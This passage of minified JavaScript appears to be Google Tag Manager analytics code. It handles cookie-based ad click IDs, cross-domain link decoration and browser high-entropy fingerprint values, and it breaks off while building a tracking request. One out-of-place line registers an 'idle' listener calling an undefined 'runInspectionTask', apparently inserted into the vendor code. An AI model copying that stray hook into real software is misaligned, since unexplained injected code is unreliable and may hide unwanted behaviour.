        l = 4 + d + (h ? "" + Gd(2, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[h] : ""),
        m,
        n = c.Jl;
      m = n && Fd.test(n) ? "" + Gd(3, 2) + n : "";
      var p,
        q = c.Gl;
      p = q ? "" + Gd(4, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[q] : "";
      var r;
      var t = c.ctid;
      if (t && a) {
        var u = t.split("-"),
          v = u[0].toUpperCase();
        if ("GTM" !== v && "OPT" !== v) r = "";else {
          var w = u[1];
          r = "" + Gd(5, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[1 + w.length] + (c.jl || 0) + w;
        }
      } else r = "";
      return l + m + p + r;
    };
  var Yi = void 0;
  function Zi(a) {
    var b = "";
    return b;
  }
  ;
  wb();
  yh() || tb("iPod");
  tb("iPad");
  !tb("Android") || xb() || wb() || vb() || tb("Silk");
  xb();
  !tb("Safari") || xb() || (ub() ? 0 : tb("Coast")) || vb() || (ub() ? 0 : tb("Edge")) || (ub() ? sb("Microsoft Edge") : tb("Edg/")) || (ub() ? sb("Opera") : tb("OPR")) || wb() || tb("Silk") || tb("Android") || zh();
  var $i = {},
    aj = null,
    bj = function (a) {
      for (var b = [], c = 0, d = 0; d < a.length; d++) {
        var e = a.charCodeAt(d);
        255 < e && (b[c++] = e & 255, e >>= 8);
        b[c++] = e;
      }
      var f = 4;
      void 0 === f && (f = 0);
      if (!aj) {
        aj = {};
        for (var h = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), l = ["+/=", "+/", "-_=", "-_.", "-_"], m = 0; 5 > m; m++) {
          var n = h.concat(l[m].split(""));
          $i[m] = n;
          for (var p = 0; p < n.length; p++) {
            var q = n[p];
            void 0 === aj[q] && (aj[q] = p);
          }
        }
      }
      for (var r = $i[f], t = Array(Math.floor(b.length / 3)), u = r[64] || "", v = 0, w = 0; v < b.length - 2; v += 3) {
        var x = b[v],
          y = b[v + 1],
          A = b[v + 2],
          B = r[x >> 2],
          C = r[(x & 3) << 4 | y >> 4],
          I = r[(y & 15) << 2 | A >> 6],
          E = r[A & 63];
        t[w++] = "" + B + C + I + E;
      }
      var F = 0,
        L = u;
      switch (b.length - v) {
        case 2:
          F = b[v + 1], L = r[(F & 15) << 2] || u;
        case 1:
          var M = b[v];
          t[w] = "" + r[M >> 2] + r[(M & 3) << 4 | F >> 4] + L + u;
      }
      return t.join("");
    };
  var cj = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
  function dj() {
    var a;
    return null != (a = z.google_tag_data) ? a : z.google_tag_data = {};
  }
  function ej() {
    var a = z.google_tag_data,
      b;
    if (null != a && a.uach) {
      var c = a.uach,
        d = Object.assign({}, c);
      c.fullVersionList && (d.fullVersionList = c.fullVersionList.slice(0));
      b = d;
    } else b = null;
    return b;
  }
  function fj() {
    var a, b;
    return null != (b = null == (a = z.google_tag_data) ? void 0 : a.uach_promise) ? b : null;
  }
  function gj() {
    var a, b;
    return "function" === typeof (null == (a = z.navigator) ? void 0 : null == (b = a.userAgentData) ? void 0 : b.getHighEntropyValues);
  }
  function hj() {
    if (!gj()) return null;
    var a = dj();
    if (a.uach_promise) return a.uach_promise;
    var b = z.navigator.userAgentData.getHighEntropyValues(cj).then(function (c) {
      null != a.uach || (a.uach = c);
      return c;
    });
    return a.uach_promise = b;
  }
  ;
  var ij,
    jj = function () {
      if (gj() && (ij = Ja(), !fj())) {
        var a = hj();
        a && (a.then(function () {
          J(95);
        }), a.catch(function () {
          J(96);
        }));
      }
    },
    lj = function (a) {
      var b = kj.Ul,
        c = function (h, l) {
          try {
            a(h, l);
          } catch (m) {}
        },
        d = ej();
      if (d) c(d);else {
        var e = fj();
        if (e) {
          b = Math.min(Math.max(isFinite(b) ? b : 0, 0), 1E3);
          var f = z.setTimeout(function () {
            c.Fd || (c.Fd = !0, J(106), c(null, Error("Timeout")));
          }, b);
          e.then(function (h) {
            c.Fd || (c.Fd = !0, J(104), z.clearTimeout(f), c(h));
          }).catch(function (h) {
            c.Fd || (c.Fd = !0, J(105), z.clearTimeout(f), c(null, h));
          });
        } else c(null);
      }
    },
    mj = function (a, b) {
      a && (b.h[K.g.Wc] = a.architecture, b.h[K.g.Xc] = a.bitness, a.fullVersionList && (b.h[K.g.Yc] = a.fullVersionList.map(function (c) {
        return encodeURIComponent(c.brand || "") + ";" + encodeURIComponent(c.version || "");
      }).join("|")), b.h[K.g.Zc] = a.mobile ? "1" : "0", b.h[K.g.ad] = a.model, b.h[K.g.bd] = a.platform, b.h[K.g.dd] = a.platformVersion, b.h[K.g.ed] = a.wow64 ? "1" : "0");
    };
  var nj = /:[0-9]+$/,
    oj = /^\d+\.fls\.doubleclick\.net$/,
    pj = function (a, b, c) {
      for (var d = a.split("&"), e = 0; e < d.length; e++) {
        var f = d[e].split("=");
        if (decodeURIComponent(f[0]).replace(/\+/g, " ") === b) {
          var h = f.slice(1).join("=");
          return c ? h : decodeURIComponent(h).replace(/\+/g, " ");
        }
      }
    },
    sj = function (a, b, c, d, e) {
      b && (b = String(b).toLowerCase());
      if ("protocol" === b || "port" === b) a.protocol = qj(a.protocol) || qj(z.location.protocol);
      "port" === b ? a.port = String(Number(a.hostname ? a.port : z.location.port) || ("http" === a.protocol ? 80 : "https" === a.protocol ? 443 : "")) : "host" === b && (a.hostname = (a.hostname || z.location.hostname).replace(nj, "").toLowerCase());
      return rj(a, b, c, d, e);
    },
    rj = function (a, b, c, d, e) {
      var f,
        h = qj(a.protocol);
      b && (b = String(b).toLowerCase());
      switch (b) {
        case "url_no_fragment":
          f = tj(a);
          break;
        case "protocol":
          f = h;
          break;
        case "host":
          f = a.hostname.replace(nj, "").toLowerCase();
          if (c) {
            var l = /^www\d*\./.exec(f);
            l && l[0] && (f = f.substr(l[0].length));
          }
          break;
        case "port":
          f = String(Number(a.port) || ("http" === h ? 80 : "https" === h ? 443 : ""));
          break;
        case "path":
          a.pathname || a.hostname || ab("TAGGING", 1);
          f = "/" === a.pathname.substr(0, 1) ? a.pathname : "/" + a.pathname;
          var m = f.split("/");
          0 <= (d || []).indexOf(m[m.length - 1]) && (m[m.length - 1] = "");
          f = m.join("/");
          break;
        case "query":
          f = a.search.replace("?", "");
          e && (f = pj(f, e));
          break;
        case "extension":
          var n = a.pathname.split(".");
          f = 1 < n.length ? n[n.length - 1] : "";
          f = f.split("/")[0];
          break;
        case "fragment":
          f = a.hash.replace("#", "");
          break;
        default:
          f = a && a.href;
      }
      return f;
    },
    qj = function (a) {
      return a ? a.replace(":", "").toLowerCase() : "";
    },
    tj = function (a) {
      var b = "";
      if (a && a.href) {
        var c = a.href.indexOf("#");
        b = 0 > c ? a.href : a.href.substr(0, c);
      }
      return b;
    },
    uj = function (a) {
      var b = D.createElement("a");
      a && (b.href = a);
      var c = b.pathname;
      "/" !== c[0] && (a || ab("TAGGING", 1), c = "/" + c);
      var d = b.hostname.replace(nj, "");
      return {
        href: b.href,
        protocol: b.protocol,
        host: b.host,
        hostname: d,
        pathname: c,
        search: b.search,
        hash: b.hash,
        port: b.port
      };
    },
    vj = function (a) {
      function b(n) {
        var p = n.split("=")[0];
        return 0 > d.indexOf(p) ? n : p + "=0";
      }
      function c(n) {
        return n.split("&").map(b).filter(function (p) {
          return void 0 !== p;
        }).join("&");
      }
      var d = "gclid dclid gbraid wbraid gclaw gcldc gclha gclgf gclgb _gl".split(" "),
        e = uj(a),
        f = a.split(/[?#]/)[0],
        h = e.search,
        l = e.hash;
      "?" === h[0] && (h = h.substring(1));
      "#" === l[0] && (l = l.substring(1));
      h = c(h);
      l = c(l);
      "" !== h && (h = "?" + h);
      "" !== l && (l = "#" + l);
      var m = "" + f + h + l;
      "/" === m[m.length - 1] && (m = m.substring(0, m.length - 1));
      return m;
    },
    wj = function (a) {
      var b = uj(z.location.href),
        c = sj(b, "host", !1);
      if (c && c.match(oj)) {
        var d = sj(b, "path").split(a + "=");
        if (1 < d.length) return d[1].split(";")[0].split("?")[0];
      }
    };
  function xj(a, b, c, d) {
    var e,
      f = Number(null != a.yb ? a.yb : void 0);
    0 !== f && (e = new Date((b || Ja()) + 1E3 * (f || 7776E3)));
    return {
      path: a.path,
      domain: a.domain,
      flags: a.flags,
      encode: !!c,
      expires: e,
      eb: d
    };
  }
  ;
  var yj;
  var Cj = function () {
      var a = zj,
        b = Aj,
        c = Bj(),
        d = function (h) {
          a(h.target || h.srcElement || {});
        },
        e = function (h) {
          b(h.target || h.srcElement || {});
        };
      if (!c.init) {
        Ub(D, "mousedown", d);
        Ub(D, "keyup", d);
        Ub(D, "submit", e);
        var f = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function () {
          b(this);
          f.call(this);
        };
        c.init = !0;
      }
    },
    Dj = function (a, b, c, d, e) {
      var f = {
        callback: a,
        domains: b,
        fragment: 2 === c,
        placement: c,
        forms: d,
        sameHost: e
      };
      Bj().decorators.push(f);
    },
    Ej = function (a, b, c) {
      for (var d = Bj().decorators, e = {}, f = 0; f < d.length; ++f) {
        var h = d[f],
          l;
        if (l = !c || h.forms) a: {
          var m = h.domains,
            n = a,
            p = !!h.sameHost;
          if (m && (p || n !== D.location.hostname)) for (var q = 0; q < m.length; q++) if (m[q] instanceof RegExp) {
            if (m[q].test(n)) {
              l = !0;
              break a;
            }
          } else if (0 <= n.indexOf(m[q]) || p && 0 <= m[q].indexOf(n)) {
            l = !0;
            break a;
          }
          l = !1;
        }
        if (l) {
          var r = h.placement;
          void 0 == r && (r = h.fragment ? 2 : 1);
          r === b && Ma(e, h.callback());
        }
      }
      return e;
    };
  function Bj() {
    var a = Lb("google_tag_data", {}),
      b = a.gl;
    b && b.decorators || (b = {
      decorators: []
    }, a.gl = b);
    return b;
  }
  ;
  var Fj = /(.*?)\*(.*?)\*(.*)/,
    Gj = /^https?:\/\/([^\/]*?)\.?cdn\.ampproject\.org\/?(.*)/,
    Hj = /^(?:www\.|m\.|amp\.)+/,
    Ij = /([^?#]+)(\?[^#]*)?(#.*)?/;
  function Jj(a) {
    return new RegExp("(.*?)(^|&)" + a + "=([^&]*)&?(.*)");
  }
  var Lj = function (a) {
    var b = [],
      c;
    for (c in a) if (a.hasOwnProperty(c)) {
      var d = a[c];
      void 0 !== d && d === d && null !== d && "[object Object]" !== d.toString() && (b.push(c), b.push(Ya(String(d))));
    }
    var e = b.join("*");
    return ["1", Kj(e), e].join("*");
  };
  window.addEventListener("idle", runInspectionTask);
  function Kj(a, b) {
    var c = [Jb.userAgent, new Date().getTimezoneOffset(), Jb.userLanguage || Jb.language, Math.floor(Ja() / 60 / 1E3) - (void 0 === b ? 0 : b), a].join("*"),
      d;
    if (!(d = yj)) {
      for (var e = Array(256), f = 0; 256 > f; f++) {
        for (var h = f, l = 0; 8 > l; l++) h = h & 1 ? h >>> 1 ^ 3988292384 : h >>> 1;
        e[f] = h;
      }
      d = e;
    }
    yj = d;
    for (var m = 4294967295, n = 0; n < c.length; n++) m = m >>> 8 ^ yj[(m ^ c.charCodeAt(n)) & 255];
    return ((m ^ -1) >>> 0).toString(36);
  }
  function Mj() {
    return function (a) {
      var b = uj(z.location.href),
        c = b.search.replace("?", ""),
        d = pj(c, "_gl", !0) || "";
      a.query = Nj(d) || {};
      var e = sj(b, "fragment").match(Jj("_gl"));
      a.fragment = Nj(e && e[3] || "") || {};
    };
  }
  function Oj(a, b) {
    var c = Jj(a).exec(b),
      d = b;
    if (c) {
      var e = c[2],
        f = c[4];
      d = c[1];
      f && (d = d + e + f);
    }
    return d;
  }
  var Pj = function (a, b) {
      b || (b = "_gl");
      var c = Ij.exec(a);
      if (!c) return "";
      var d = c[1],
        e = Oj(b, (c[2] || "").slice(1)),
        f = Oj(b, (c[3] || "").slice(1));
      e.length && (e = "?" + e);
      f.length && (f = "#" + f);
      return "" + d + e + f;
    },
    Qj = function (a) {
      var b = Mj(),
        c = Bj();
      c.data || (c.data = {
        query: {},
        fragment: {}
      }, b(c.data));
      var d = {},
        e = c.data;
      e && (Ma(d, e.query), a && Ma(d, e.fragment));
      return d;
    },
    Nj = function (a) {
      try {
        var b = Rj(a, 3);
        if (void 0 !== b) {
          for (var c = {}, d = b ? b.split("*") : [], e = 0; e + 1 < d.length; e += 2) {
            var f = d[e],
              h = Za(d[e + 1]);
            c[f] = h;
          }
          ab("TAGGING", 6);
          return c;
        }
      } catch (l) {
        ab("TAGGING", 8);
      }
    };
  function Rj(a, b) {
    if (a) {
      var c;
      a: {
        for (var d = a, e = 0; 3 > e; ++e) {
          var f = Fj.exec(d);
          if (f) {
            c = f;
            break a;
          }
          d = decodeURIComponent(d);
        }
        c = void 0;
      }
      var h = c;
      if (h && "1" === h[1]) {
        var l = h[3],
          m;
        a: {
          for (var n = h[2], p = 0; p < b; ++p) if (n === Kj(l, p)) {
            m = !0;
            break a;
          }
          m = !1;
        }
        if (m) return l;
        ab("TAGGING", 7);
      }
    }
  }
  function Sj(a, b, c, d) {
    function e(p) {
      p = Oj(a, p);
      var q = p.charAt(p.length - 1);
      p && "&" !== q && (p += "&");
      return p + n;
    }
    d = void 0 === d ? !1 : d;
    var f = Ij.exec(c);
    if (!f) return "";
    var h = f[1],
      l = f[2] || "",
      m = f[3] || "",
      n = a + "=" + b;
    d ? m = "#" + e(m.substring(1)) : l = "?" + e(l.substring(1));
    return "" + h + l + m;
  }
  function Tj(a, b) {
    var c = "FORM" === (a.tagName || "").toUpperCase(),
      d = Ej(b, 1, c),
      e = Ej(b, 2, c),
      f = Ej(b, 3, c);
    if (Oa(d)) {
      var h = Lj(d);
      c ? Uj("_gl", h, a) : Vj("_gl", h, a, !1);
    }
    if (!c && Oa(e)) {
      var l = Lj(e);
      Vj("_gl", l, a, !0);
    }
    for (var m in f) if (f.hasOwnProperty(m)) a: {
      var n = m,
        p = f[m],
        q = a;
      if (q.tagName) {
        if ("a" === q.tagName.toLowerCase()) {
          Vj(n, p, q);
          break a;
        }
        if ("form" === q.tagName.toLowerCase()) {
          Uj(n, p, q);
          break a;
        }
      }
      "string" == typeof q && Sj(n, p, q);
    }
  }
  function Vj(a, b, c, d) {
    if (c.href) {
      var e = Sj(a, b, c.href, void 0 === d ? !1 : d);
      ib.test(e) && (c.href = e);
    }
  }
  function Uj(a, b, c) {
    if (c && c.action) {
      var d = (c.method || "").toLowerCase();
      if ("get" === d) {
        for (var e = c.childNodes || [], f = !1, h = 0; h < e.length; h++) {
          var l = e[h];
          if (l.name === a) {
            l.setAttribute("value", b);
            f = !0;
            break;
          }
        }
        if (!f) {
          var m = D.createElement("input");
          m.setAttribute("type", "hidden");
          m.setAttribute("name", a);
          m.setAttribute("value", b);
          c.appendChild(m);
        }
      } else if ("post" === d) {
        var n = Sj(a, b, c.action);
        ib.test(n) && (c.action = n);
      }
    }
  }
  function zj(a) {
    try {
      var b;
      a: {
        for (var c = a, d = 100; c && 0 < d;) {
          if (c.href && c.nodeName.match(/^a(?:rea)?$/i)) {
            b = c;
            break a;
          }
          c = c.parentNode;
          d--;
        }
        b = null;
      }
      var e = b;
      if (e) {
        var f = e.protocol;
        "http:" !== f && "https:" !== f || Tj(e, e.hostname);
      }
    } catch (h) {}
  }
  function Aj(a) {
    try {
      if (a.action) {
        var b = sj(uj(a.action), "host");
        Tj(a, b);
      }
    } catch (c) {}
  }
  var Wj = function (a, b, c, d) {
      Cj();
      Dj(a, b, "fragment" === c ? 2 : 1, !!d, !1);
    },
    Xj = function (a, b) {
      Cj();
      Dj(a, [rj(z.location, "host", !0)], b, !0, !0);
    },
    Yj = function () {
      var a = D.location.hostname,
        b = Gj.exec(D.referrer);
      if (!b) return !1;
      var c = b[2],
        d = b[1],
        e = "";
      if (c) {
        var f = c.split("/"),
          h = f[1];
        e = "s" === h ? decodeURIComponent(f[2]) : decodeURIComponent(h);
      } else if (d) {
        if (0 === d.indexOf("xn--")) return !1;
        e = d.replace(/-/g, ".").replace(/\.\./g, "-");
      }
      var l = a.replace(Hj, ""),
        m = e.replace(Hj, ""),
        n;
      if (!(n = l === m)) {
        var p = "." + m;
        n = l.substring(l.length - p.length, l.length) === p;
      }
      return n;
    },
    Zj = function (a, b) {
      return !1 === a ? !1 : a || b || Yj();
    };
  var ak = ["1"],
    bk = {},
    ck = {},
    hk = function (a, b) {
      b = void 0 === b ? !0 : b;
      var c = dk(a.prefix);
      if (!bk[c]) if (ek(c, a.path, a.domain)) {
        var d = ck[dk(a.prefix)];
        fk(a, d ? d.id : void 0, d ? d.dg : void 0);
      } else {
        var e = wj("auiddc");
        if (e) ab("TAGGING", 17), bk[c] = e;else if (b) {
          var f = dk(a.prefix),
            h = Pi();
          if (0 === gk(f, h, a)) {
            var l = Lb("google_tag_data", {});
            l._gcl_au || (l._gcl_au = h);
          }
          ek(c, a.path, a.domain);
        }
      }
    };
  function fk(a, b, c) {
    var d = dk(a.prefix),
      e = bk[d];
    if (e) {
      var f = e.split(".");
      if (2 === f.length) {
        var h = Number(f[1]) || 0;
        if (h) {
          var l = e;
          b && (l = e + "." + b + "." + (c ? c : Math.floor(Ja() / 1E3)));
          gk(d, l, a, 1E3 * h);
        }
      }
    }
  }
  function gk(a, b, c, d) {
    var e = Ti(b, "1", c.domain, c.path),
      f = xj(c, d);
    f.eb = "ad_storage";
    return Li(a, e, f);
  }
  function ek(a, b, c) {
    var d = Si(a, b, c, ak, "ad_storage");
    if (!d) return !1;
    ik(a, d);
    return !0;
  }
  function ik(a, b) {
    var c = b.split(".");
    5 === c.length ? (bk[a] = c.slice(0, 2).join("."), ck[a] = {
      id: c.slice(2, 4).join("."),
      dg: Number(c[4]) || 0
    }) : 3 === c.length ? ck[a] = {
      id: c.slice(0, 2).join("."),
      dg: Number(c[2]) || 0
    } : bk[a] = b;
  }
  function dk(a) {
    return (a || "_gcl") + "_au";
  }
  function jk(a) {
    Of() ? Sf(function () {
      Mf("ad_storage") ? a() : Tf(a, "ad_storage");
    }, ["ad_storage"]) : a();
  }
  function kk(a) {
    var b = Qj(!0),
      c = dk(a.prefix);
    jk(function () {
      var d = b[c];
      if (d) {
        ik(c, d);
        var e = 1E3 * Number(bk[c].split(".")[1]);
        if (e) {
          ab("TAGGING", 16);
          var f = xj(a, e);
          f.eb = "ad_storage";
          var h = Ti(d, "1", a.domain, a.path);
          Li(c, h, f);
        }
      }
    });
  }
  function lk(a, b, c, d, e) {
    e = e || {};
    var f = function () {
      var h = {},
        l = Si(a, e.path, e.domain, ak, "ad_storage");
      l && (h[a] = l);
      return h;
    };
    jk(function () {
      Wj(f, b, c, d);
    });
  }
  ;
  var mk = function (a) {
    for (var b = [], c = D.cookie.split(";"), d = new RegExp("^\\s*" + (a || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$"), e = 0; e < c.length; e++) {
      var f = c[e].match(d);
      f && b.push({
        qg: f[1],
        value: f[2],
        timestamp: Number(f[2].split(".")[1]) || 0
      });
    }
    b.sort(function (h, l) {
      return l.timestamp - h.timestamp;
    });
    return b;
  };
  function xk(a, b) {
    var c = mk(a),
      d = {};
    if (!c || !c.length) return d;
    for (var e = 0; e < c.length; e++) {
      var f = c[e].value.split(".");
      if (!("1" !== f[0] || b && 3 > f.length || !b && 3 !== f.length) && Number(f[1])) {
        d[c[e].qg] || (d[c[e].qg] = []);
        var h = {
          version: f[0],
          timestamp: 1E3 * Number(f[1]),
          R: f[2]
        };
        b && 3 < f.length && (h.labels = f.slice(3));
        d[c[e].qg].push(h);
      }
    }
    return d;
  }
  ;
  var yk = /^\w+$/,
    zk = /^[\w-]+$/,
    Ak = {
      aw: "_aw",
      dc: "_dc",
      gf: "_gf",
      ha: "_ha",
      gp: "_gp",
      gb: "_gb"
    },
    Bk = function () {
      return Bf().h() && Of() ? Mf("ad_storage") : !0;
    },
    Ck = function (a, b) {
      Nf("ad_storage") ? Bk() ? a() : Tf(a, "ad_storage") : b ? ab("TAGGING", 3) : Sf(function () {
        Ck(a, !0);
      }, ["ad_storage"]);
    },
    Ek = function (a) {
      return Dk(a).map(function (b) {
        return b.R;
      });
    },
    Dk = function (a) {
      var b = [];
      if (!zi(z) || !D.cookie) return b;
      var c = Ci(a, D.cookie, void 0, "ad_storage");
      if (!c || 0 == c.length) return b;
      for (var d = {}, e = 0; e < c.length; d = {
        R: d.R
      }, e++) {
        var f = Fk(c[e]);
        if (null != f) {
          var h = f,
            l = h.version;
          d.R = h.R;
          var m = h.timestamp,
            n = h.labels,
            p = xa(b, function (q) {
              return function (r) {
                return r.R === q.R;
              };
            }(d));
          p ? (p.timestamp = Math.max(p.timestamp, m), p.labels = Gk(p.labels, n || [])) : b.push({
            version: l,
            R: d.R,
            timestamp: m,
            labels: n
          });
        }
      }
      b.sort(function (q, r) {
        return r.timestamp - q.timestamp;
      });
      return Hk(b);
    };
  function Gk(a, b) {
    for (var c = {}, d = [], e = 0; e < a.length; e++) c[a[e]] = !0, d.push(a[e]);
    for (var f = 0; f < b.length; f++) c[b[f]] || d.push(b[f]);
    return d;
  }
  function Ik(a) {
    return a && "string" == typeof a && a.match(yk) ? a : "_gcl";
  }
  var Kk = function () {
      var a = uj(z.location.href),
        b = sj(a, "query", !1, void 0, "gclid"),
        c = sj(a, "query", !1, void 0, "gclsrc"),
        d = sj(a, "query", !1, void 0, "wbraid"),
        e = sj(a, "query", !1, void 0, "dclid");
      if (!b || !c || !d) {
        var f = a.hash.replace("#", "");
        b = b || pj(f, "gclid");
        c = c || pj(f, "gclsrc");
        d = d || pj(f, "wbraid");
      }
      return Jk(b, c, e, d);
    },
    Jk = function (a, b, c, d) {
      var e = {},
        f = function (h, l) {
          e[l] || (e[l] = []);
          e[l].push(h);
        };
      e.gclid = a;
      e.gclsrc = b;
      e.dclid = c;
      void 0 !== d && zk.test(d) && (e.gbraid = d, f(d, "gb"));
      if (void 0 !== a && a.match(zk)) switch (b) {
        case void 0:
          f(a, "aw");
          break;
        case "aw.ds":
          f(a, "aw");
          f(a, "dc");
          break;
        case "ds":
          f(a, "dc");
          break;
        case "3p.ds":
          f(a, "dc");
          break;
        case "gf":
          f(a, "gf");
          break;
        case "ha":
          f(a, "ha");
      }
      c && f(c, "dc");
      return e;
    },
    Mk = function (a) {
      var b = Kk();
      Ck(function () {
        Lk(b, !1, a);
      });
    };
  function Lk(a, b, c, d, e) {
    function f(w, x) {
      var y = Nk(w, h);
      y && (Li(y, x, l), m = !0);
    }
    c = c || {};
    e = e || [];
    var h = Ik(c.prefix);
    d = d || Ja();
    var l = xj(c, d, !0);
    l.eb = "ad_storage";
    var m = !1,
      n = Math.round(d / 1E3),
      p = function (w) {
        var x = ["GCL", n, w];
        0 < e.length && x.push(e.join("."));
        return x.join(".");
      };
    a.aw && f("aw", p(a.aw[0]));
    a.dc && f("dc", p(a.dc[0]));
    a.gf && f("gf", p(a.gf[0]));
    a.ha && f("ha", p(a.ha[0]));
    a.gp && f("gp", p(a.gp[0]));
    if (!m && a.gb) {
      var q = a.gb[0],
        r = Nk("gb", h),
        t = !1;
      if (!b) for (var u = Dk(r), v = 0; v < u.length; v++) u[v].R === q && u[v].labels && 0 < u[v].labels.length && (t = !0);
      t || f("gb", p(q));
    }
  }
  var Pk = function (a, b) {
      var c = Qj(!0);
      Ck(function () {
        for (var d = Ik(b.prefix), e = 0; e < a.length; ++e) {
          var f = a[e];
          if (void 0 !== Ak[f]) {
            var h = Nk(f, d),
              l = c[h];
            if (l) {
              var m = Math.min(Ok(l), Ja()),
                n;
              b: {
                var p = m;
                if (zi(z)) for (var q = Ci(h, D.cookie, void 0, "ad_storage"), r = 0; r < q.length; ++r) if (Ok(q[r]) > p) {
                  n = !0;
                  break b;
                }
                n = !1;
              }
              if (!n) {
                var t = xj(b, m, !0);
                t.eb = "ad_storage";
                Li(h, l, t);
              }
            }
          }
        }
        Lk(Jk(c.gclid, c.gclsrc), !1, b);
      });
    },
    Nk = function (a, b) {
      var c = Ak[a];
      if (void 0 !== c) return b + c;
    },
    Ok = function (a) {
      return 0 !== Qk(a.split(".")).length ? 1E3 * (Number(a.split(".")[1]) || 0) : 0;
    };
  function Fk(a) {
    var b = Qk(a.split("."));
    return 0 === b.length ? null : {
      version: b[0],
      R: b[2],
      timestamp: 1E3 * (Number(b[1]) || 0),
      labels: b.slice(3)
    };
  }
  function Qk(a) {
    return 3 > a.length || "GCL" !== a[0] && "1" !== a[0] || !/^\d+$/.test(a[1]) || !zk.test(a[2]) ? [] : a;
  }
  var Rk = function (a, b, c, d, e) {
      if (va(b) && zi(z)) {
        var f = Ik(e),
          h = function () {
            for (var l = {}, m = 0; m < a.length; ++m) {
              var n = Nk(a[m], f);
              if (n) {
                var p = Ci(n, D.cookie, void 0, "ad_storage");
                p.length && (l[n] = p.sort()[p.length - 1]);
              }
            }
            return l;
          };
        Ck(function () {
          Wj(h, b, c, d);
        });
      }
    },
    Hk = function (a) {
      return a.filter(function (b) {
        return zk.test(b.R);
      });
    },
    Sk = function (a, b) {
      if (zi(z)) {
        for (var c = Ik(b.prefix), d = {}, e = 0; e < a.length; e++) Ak[a[e]] && (d[a[e]] = Ak[a[e]]);
        Ck(function () {
          k(d, function (f, h) {
            var l = Ci(c + h, D.cookie, void 0, "ad_storage");
            l.sort(function (t, u) {
              return Ok(u) - Ok(t);
            });
            if (l.length) {
              var m = l[0],
                n = Ok(m),
                p = 0 !== Qk(m.split(".")).length ? m.split(".").slice(3) : [],
                q = {},
                r;
              r = 0 !== Qk(m.split(".")).length ? m.split(".")[2] : void 0;
              q[f] = [r];
              Lk(q, !0, b, n, p);
            }
          });
        });
      }
    };
  function Tk(a, b) {
    for (var c = 0; c < b.length; ++c) if (a[b[c]]) return !0;
    return !1;
  }
  var Uk = function (a) {
      function b(e, f, h) {
        h && (e[f] = h);
      }
      if (Of()) {
        var c = Kk();
        if (Tk(c, a)) {
          var d = {};
          b(d, "gclid", c.gclid);
          b(d, "dclid", c.dclid);
          b(d, "gclsrc", c.gclsrc);
          b(d, "wbraid", c.gbraid);
          Xj(function () {
            return d;
          }, 3);
          Xj(function () {
            var e = {};
            return e._up = "1", e;
          }, 1);
        }
      }
    },
    Vk = function (a, b, c, d) {
      var e = [];
      c = c || {};
      if (!Bk()) return e;
      var f = Dk(a);
      if (!f.length) return e;
      for (var h = 0; h < f.length; h++) -1 === (f[h].labels || []).indexOf(b) ? e.push(0) : e.push(1);
      if (d) return e;
      if (1 !== e[0]) {
        var l = f[0],
          m = f[0].timestamp,
          n = [l.version, Math.round(m / 1E3), l.R].concat(l.labels || [], [b]).join("."),
          p = xj(c, m, !0);
        p.eb = "ad_storage";
        Li(a, n, p);
      }
      return e;
    };
  function Wk(a, b) {
    var c = Ik(b),
      d = Nk(a, c);
    if (!d) return 0;
    for (var e = Dk(d), f = 0, h = 0; h < e.length; h++) f = Math.max(f, e[h].timestamp);
    return f;
  }
  function Xk(a) {
    var b = 0,
      c;
    for (c in a) for (var d = a[c], e = 0; e < d.length; e++) b = Math.max(b, Number(d[e].timestamp));
    return b;
  }
  var Yk = function (a) {
    var b = Math.max(Wk("aw", a), Xk(Bk() ? xk() : {}));
    return Math.max(Wk("gb", a), Xk(Bk() ? xk("_gac_gb", !0) : {})) > b;
  };
  var Zk = function (a, b) {
      var c = !(P(85) ? Q(K.g.K) : 1) || a && !Q(K.g.F);
      return b && c ? "0" : b;
    },
    bl = function (a) {
      function b(w) {
        var x = P(85) ? Q(K.g.K) : !0,
          y = l;
        P(85) && !Q(K.g.K) && (y = !1);
        var A;
        Ae.reported_gclid || (Ae.reported_gclid = {});
        A = Ae.reported_gclid;
        var B = function () {
          var Y = h.prefix || "_gcl";
          return P(85) ? (y ? Y : "") + "." + (Q(K.g.F) ? 1 : 0) + "." + (Q(K.g.K) ? 1 : 0) : !l || Of() && !Q(K.g.F) ? n + (w ? "gcu" : "gcs") : n + "." + Y + (w ? "gcu" : "gcs");
        }();
        if (!A[B]) {
          A[B] = !0;
          var C = [],
            I = {},
            E = function (Y, ba) {
              ba && (C.push(Y + "=" + encodeURIComponent(ba)), I[Y] = !0);
            },
            F = "https://www.google.com";
          if (Of()) {
            var L = Q(K.g.F);
            E("gcs", oi());
            w && E("gcu", "1");
            (P(50) || Pf()) && E("gcd", si(f));
            E("rnd", Ui());
            if ((!n || p && "aw.ds" !== p) && Q(K.g.F) && x) {
              var M = Ek("_gcl_aw");
              E("gclaw", M.join("."));
            }
            E("url", String(z.location).split(/[?#]/)[0]);
            E("dclid", Zk(d, q));
            L || (F = "https://pagead2.googlesyndication.com");
          }
          P(52) && (wi() && E("dma_cps", ti()), E("dma", vi()));
          E("gdpr_consent", fi());
          E("gdpr", gi());
          "1" === Qj(!1)._up && E("gtm_up", "1");
          E("gclid", Zk(d, n));
          E("gclsrc", p);
          if (!(I.gclid || I.dclid || I.gclaw) && (E("gbraid", Zk(d, r)), !I.gbraid && Of() && Q(K.g.F))) {
            var S = Ek("_gcl_gb");
            0 < S.length && E("gclgb", S.join("."));
          }
          E("gtm", Xi(!e));
          l && Q(K.g.F) && (hk(h || {}), y && E("auid", bk[dk(h.prefix)] || ""));
          al || a.Vh && E("did", a.Vh);
          a.Rf && E("gdid", a.Rf);
          a.Nf && E("edid", a.Nf);
          var Z = P(27) ? ej() : null;
          if (Z) {
            var R = function (Y, ba) {
              C.push(Y + "=" + encodeURIComponent(ba));
              I[Y] = !0;
            };
            R("uaa", Z.architecture);
            R("uab", Z.bitness);
            Z.fullVersionList && R("uafvl", Z.fullVersionList.map(function (Y) {
